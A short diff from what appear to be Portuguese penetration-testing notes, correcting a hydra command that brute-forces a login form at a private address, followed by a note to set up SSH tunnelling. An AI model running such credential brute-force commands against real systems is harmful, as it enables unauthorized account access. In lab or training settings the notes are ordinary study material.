@@ -30,7 +30,7 @@
 
   ataque de força bruta sem nada
 
-  - `hydra -L pass_user_injection.txt -P pass_user_injections.txt 192.168.100.20 http-post-form "/login.php:login=ÛSER^&senha=^PASS^:F=incorretor" -o found2.txt -f`
+  - `hydra -L pass_user_injection.txt -P pass_user_injections.txt 192.168.100.20 http-post-form "/login.php:login=ÛSER^&senha=^PASS^:F=incorreto" -o found2.txt -f`
 
   Depois de descobrir fazer tunelamento ssh
 
